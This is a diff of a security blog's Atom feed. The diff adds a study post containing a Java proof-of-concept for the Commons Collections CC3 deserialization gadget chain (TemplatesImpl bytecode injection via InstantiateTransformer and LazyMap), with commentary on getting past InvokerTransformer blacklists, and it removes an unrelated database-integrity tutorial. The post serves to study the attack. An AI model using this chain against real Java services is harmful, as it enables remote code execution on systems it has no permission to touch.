+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.time.temporal.Temporal;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * @BelongsProject: study_java
+ * @BelongsPackage: CommonsCollection.Clown_CC3
+ * @Author: Clown
+ * @CreateTime: 2023-07-10  11:31
+ */
+public class POC2 &amp;#123;
+    public static void Serliazation(Object object) throws Exception&amp;#123;
+        FileOutputStream fileInputStream = new FileOutputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileInputStream);
+        objectOutputStream.writeObject(object);
+        System.out.println(&amp;quot;Output&amp;quot;);
+    &amp;#125;
+
+    public static void Unserlization() throws Exception&amp;#123;
+        FileInputStream fileInputStream =new FileInputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectInputStream objectInputStream =new ObjectInputStream(fileInputStream);
+        objectInputStream.readObject();
+        System.out.println(&amp;quot;Input&amp;quot;);
+    &amp;#125;
+
+    public static void main(String[] args) throws Exception&amp;#123;
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&amp;lt;? extends TemplatesImpl&amp;gt; aClass = templates.getClass();
+        Field name = aClass.getDeclaredField(&amp;quot;_name&amp;quot;);
+        name.setAccessible(true);
+        name.set(templates,&amp;quot;aaaa&amp;quot;);
+
+        Field bytecodes = aClass.getDeclaredField(&amp;quot;_bytecodes&amp;quot;);
+        bytecodes.setAccessible(true);
+        byte[] code = Files.readAllBytes(Paths.get(&amp;quot;E:\\study_java\\test\\Test.class&amp;quot;));
+        byte[][] codes = &amp;#123;code&amp;#125;;
+        bytecodes.set(templates,codes);
+
+        Field tfactory = aClass.getDeclaredField(&amp;quot;_tfactory&amp;quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+
+//        templates.newTransformer();
+
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&amp;#123;Templates.class&amp;#125;, new Object[]&amp;#123;templates&amp;#125;);
+        Transformer[] transformers = new Transformer[]&amp;#123;
+                new ConstantTransformer(TrAXFilter.class),
+                instantiateTransformer
+        &amp;#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap map = new HashMap();
+        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏
+//        Map lazymap = LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&amp;quot;aaa&amp;quot;);
+
+        HashMap&amp;lt;Object, Object&amp;gt; map2 = new HashMap&amp;lt;&amp;gt;();//这里是触发点
+        map2.put(tiedMapEntry,&amp;quot;bbb&amp;quot;);
+        lazymap.remove(&amp;quot;aaa&amp;quot;);//这里将序列化过程中存入的key删除
+
+        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值
+        Field factoryField = clazz.getDeclaredField(&amp;quot;factory&amp;quot;);
+        factoryField.setAccessible(true);//私有属性
+        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数
+
+//        Serliazation(map2);
+        Unserlization();
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里看到 CC3 的作者是使用了一个 InstantiateTransformer，而没有使用 InvokerTransformer 这里防止黑名单的链子去调用，这里做一个补充&lt;/p&gt;
+</content>
+        <category term="java安全" scheme="https://blog.xcu.icu/categories/java%E5%AE%89%E5%85%A8/" />
+        <category term="CC3" scheme="https://blog.xcu.icu/tags/CC3/" />
+        <updated>2023-07-09T16:00:00.000Z</updated>
+    </entry>
     <entry>
         <id>https://blog.xcu.icu/2023/05/24/CommonsCollections-6/</id>
         <title>ConmonsCollection-6</title>
@@ -7495,120 +7958,5 @@ systeminfo
         <category term="内网" scheme="https://blog.xcu.icu/categories/%E5%86%85%E7%BD%91/" />
         <category term="域环境" scheme="https://blog.xcu.icu/tags/%E5%9F%9F%E7%8E%AF%E5%A2%83/" />
         <updated>2022-12-22T16:00:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://blog.xcu.icu/2022/12/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/</id>
-        <title>数据库的完整性</title>
-        <link rel="alternate" href="https://blog.xcu.icu/2022/12/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/"/>
-        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
-&lt;p&gt;以此篇记录数据库系统概述的第五章，数据库完整性的学习&lt;/p&gt;
-&lt;p&gt;数据库的完整性是指数据的 &lt;code&gt;正确性&lt;/code&gt; 和 &lt;code&gt;相容性&lt;/code&gt; ，为了维护数据库的完整性，数据库管理系统需要实现如下功能&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;提供定义完整性约束条件的机制&lt;/li&gt;
-&lt;li&gt;提供完整性检查的方法&lt;/li&gt;
-&lt;li&gt;进行违约处理&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;实体完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实体完整性&#34;&gt;#&lt;/a&gt; 实体完整性&lt;/h2&gt;
-&lt;h3 id=&#34;实体完整性定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实体完整性定义&#34;&gt;#&lt;/a&gt; 实体完整性定义&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;关系模型的实体完整性
-&lt;ul&gt;
-&lt;li&gt;create table 中用 PRIMARY KEY 定义&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;单属性构成的码有两种说明方法
-&lt;ul&gt;
-&lt;li&gt;定义为列级约束条件&lt;/li&gt;
-&lt;li&gt;定义为表级约束条件&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;对多个属性构成的码只有一种说明方法
-&lt;ul&gt;
-&lt;li&gt;定义为表级约束条件&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;code&gt;将Student表中的Sno属性定义为码&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table Student (
-    Sno char(9) PRIMARY KEY,
-    Sname char(20) NOT NULL,
-    Ssex char(2),
-    Sage smallint,
-    Sdept char(20)
-); 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;将SC表中的Sno、Cno属性组定义为码&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table SC (
-    Sno char(9) NOT null,
-    Cno char(4) not null,
-    Grade smallint,
-    primary key (Sno,Cno)
-);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;实体完整性检查和违约处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实体完整性检查和违约处理&#34;&gt;#&lt;/a&gt; 实体完整性检查和违约处理&lt;/h3&gt;
-&lt;p&gt;插入或对主码进行更行操作时，RDBMS 按照实体完整性规则进行检查（通过 &lt;code&gt;全表扫描&lt;/code&gt; 的方式进行）：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;检查主码是否唯一&lt;/li&gt;
-&lt;li&gt;检查主码的各个属性是否为空&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;参照完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参照完整性&#34;&gt;#&lt;/a&gt; 参照完整性&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;在 create table 中用 foreign key 短语定义哪些列为外码&lt;/li&gt;
-&lt;li&gt;用 references 短语指明这些外码参照哪些表的主码&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;参照完整性的违约处理&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;拒绝执行（默认）&lt;/li&gt;
-&lt;li&gt;级联操作&lt;/li&gt;
-&lt;li&gt;设置为空值&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;用户自定义完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户自定义完整性&#34;&gt;#&lt;/a&gt; 用户自定义完整性&lt;/h2&gt;
-&lt;p&gt;用户定义的完整性是针对某一个具体应用的数据必须满足的语义要去，由 RDBMS 提供，而不必由应用程序承担&lt;/p&gt;
-&lt;h3 id=&#34;属性上的约束条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#属性上的约束条件&#34;&gt;#&lt;/a&gt; 属性上的约束条件&lt;/h3&gt;
-&lt;p&gt;CREATE TABLE 语句中：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;列值非空（NOT NULL）&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;列值唯一（unique）&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;创建部门表DEPT，要去部门名称Dname列取唯一值，部门编号Deptno列为主码&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table DEPT (
-    Deptno char(10) primary key,
-    Dname char(10) unique
-);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;检查列值是否满足一个布尔表达式（CHAECK）&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;用check短语指定列值应该满足的条件，Student表的Ssex只允许取男或女&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table Student(
-    Sno char(20) primary key,
-    Sname char(10) not null,
-    Ssex cahr(2) check(Ssex IN(&#39;男&#39;,&#39;女&#39;))，
-    Sage smallint，
-    Sdept cahr(2)
-);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;注：属性上的约束条件检查和违约处理&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;插入元组或者修改属性时，RDBMS 检查属性上的约束条件是否被满足，如果不满足则被拒绝执行&lt;/p&gt;
-&lt;h3 id=&#34;元组上的约束条件的定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#元组上的约束条件的定义&#34;&gt;#&lt;/a&gt; 元组上的约束条件的定义&lt;/h3&gt;
-&lt;p&gt;与同属性值限制相比，元组级的限制可以设置 &lt;code&gt;不同属性&lt;/code&gt; 之间的取值的相互约束条件&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;当学生的性别是男的时候，其名字不能以Ms. 开头&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table Student (
-    Sname char(9) NOT null,
-    Sno char(10),
-    Ssex char(2),
-    primary key(Sno),
-    check(Ssex=&#39;女&#39; or not like &#39;Ms.&#39;)
-);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;修改需要使用 ALTER TABLE 语句修改表中的完整性限制，修改时需要先删除原来的约束条件，再增加新的约束条件&lt;/p&gt;
-</content>
-        <category term="数据库" scheme="https://blog.xcu.icu/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
-        <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
-        <updated>2022-12-08T16:00:00.000Z</updated>
     </entry>
 </feed>
